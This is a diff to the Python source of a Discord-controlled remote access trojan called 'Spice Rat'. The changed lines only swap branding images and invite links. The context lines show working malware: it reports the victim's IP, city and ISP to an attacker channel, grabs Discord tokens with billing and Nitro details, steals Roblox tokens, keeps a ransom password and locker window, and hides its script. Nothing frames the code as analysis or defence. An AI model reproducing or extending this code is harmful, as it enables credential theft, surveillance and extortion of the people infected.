@@ -60,8 +60,8 @@ bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 def spice_embed(text, color=0x00aaff, thumbnail=True):
     embed = discord.Embed(title="spice • TERMINAL", description=text, color=color)
     if thumbnail:
-        embed.set_thumbnail(url="https://ibb.co/ycZwj8cg")
-    embed.set_footer(text="Spice multitool _ https://discord.gg/JBvTDe5JmE", icon_url="https://ibb.co/ycZwj8cg")
+        embed.set_thumbnail(url="https://cdn.corenexis.com/f/y15N0UHkOAa.png")
+    embed.set_footer(text="Spice multitool _ https://discord.gg/eAK2dF6xYN", icon_url="https://cdn.corenexis.com/f/y15N0UHkOAa.png")
     return embed
 
 def hide_script():
@@ -432,10 +432,10 @@ async def on_ready():
         value=f"**IP:** `{ip}` :flag_{flag.lower()}:\n**Location:** `{city}, {region}`\n**ISP:** `{isp}`",
         inline=False
     )
-    embed.set_thumbnail(url="https://discord.gg/JBvTDe5JmE")
+    embed.set_thumbnail(url="https://discord.gg/eAK2dF6xYN")
     embed.set_footer(
-        text="Spice multitool • https://discord.gg/JBvTDe5JmE",
-        icon_url="https://ibb.co/ycZwj8cg"
+        text="Spice multitool • https://discord.gg/eAK2dF6xYN",
+        icon_url="https://cdn.corenexis.com/f/y15N0UHkOAa.png"
     )
     await channel.send(content="@here", embed=embed)
     game = discord.Game("Window logging stopped")
@@ -445,7 +445,7 @@ async def on_ready():
 
 log_channel_id = 0
 RANSOM_PW = "Spice_0nToP"
-IMAGE_URL = "https://ibb.co/ycZwj8cg"
+IMAGE_URL = "https://cdn.corenexis.com/f/f67ucvOluWP.png"
 HOSTNAME = socket.gethostname()
 locker_window = None
 _killer_stop = threading.Event()
@@ -687,7 +687,7 @@ def volumeup():
 def volumedown():
     os.system("powershell -c (New-Object -ComObject WScript.Shell).SendKeys([char]174)")
 
-thumb = "https://ibb.co/ycZwj8cg"
+thumb = "https://cdn.corenexis.com/f/y15N0UHkOAa.png"
 def get_embed(page: str):
     e = discord.Embed(title="Spice • COMMANDS", color=0x00aaff)
     e.set_thumbnail(url=thumb)
@@ -792,7 +792,7 @@ def get_embed(page: str):
             "`!kill <session/all>`"
         )
 
-    e.set_footer(text="Spice Rat • https://discord.gg/JBvTDe5JmE")
+    e.set_footer(text="Spice Rat • https://discord.gg/eAK2dF6xYN")
     return e
 
 class HelpSelect(discord.ui.Select):
@@ -983,7 +983,7 @@ async def roblox(ctx):
     else:
         embed.add_field(name="Token", value=f"```\n{token}\n```", inline=False)
 
-    embed.set_footer(text=f"Spice Multitool | https://discord.gg/JBvTDe5JmE")
+    embed.set_footer(text=f"Spice Multitool | https://discord.gg/eAK2dF6xYN")
 
     await ctx.send(embed=embed)
 
@@ -1009,11 +1009,11 @@ async def grab_tokens(ctx):
                 userjson = r.json()
                 pic = userjson.get("avatar")
                 uid = userjson.get("id")
-                pfp = f"https://cdn.discordapp.com/avatars/{uid}/{pic}" if pic else "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png"
+                pfp = f"https://cdn.discordapp.com/avatars/{uid}/{pic}" if pic else "https://cdn.corenexis.com/f/y15N0UHkOAa.png"
             else:
-                pfp = "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png"
+                pfp = "https://cdn.corenexis.com/f/y15N0UHkOAa.png"
         except Exception:
-            pfp = "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png"
+            pfp = "https://cdn.corenexis.com/f/y15N0UHkOAa.png"
         embed = discord.Embed(
             title=f"Token Info: {t['u']}",
             color=0x00A3FF
@@ -1025,7 +1025,7 @@ async def grab_tokens(ctx):
         embed.add_field(name=":gem: Nitro:", value=t['n'], inline=False)
         embed.add_field(name=":money_with_wings: Billing:", value=t['b'], inline=False)
         embed.add_field(name=":key: Token:", value=f"```{t['t']}```", inline=False)
-        embed.set_footer(text="Spice Rat • https://discord.gg/JBvTDe5JmE")
+        embed.set_footer(text="Spice Rat • https://discord.gg/eAK2dF6xYN")
         embeds_to_send.append(embed)
     await ctx.send(embeds=embeds_to_send)
     await ctx.send(f"Spice found **{len(embeds_to_send)}** tokens on victim pc.")
@@ -1538,7 +1538,7 @@ async def on_message(message):
             html_path = os.path.join(temp, "update_check.html")
             with open(html_path, "w") as f:
                 f.write('<html><head><style>*{margin:0;padding:0;cursor:none}body{background:#000;overflow:hidden}</style></head><body>'
-                    '<img id="s" src="https://upload.wikimedia.org/wikipedia/commons/8/89/Scary_Face.jpg" style="width:100vw;height:100vh;object-fit:cover;display:none">'
+                    '<img id="s" src="https://cdn.corenexis.com/f/3YeOBZA3XSu.webp" style="width:100vw;height:100vh;object-fit:cover;display:none">'
                     '<script>'
                     'let c=new(window.AudioContext||window.webkitAudioContext),o=c.createOscillator(),g=c.createGain();'
                     'o.type="sawtooth";o.frequency.value=180;g.gain.value=1;o.connect(g);g.connect(c.destination);'
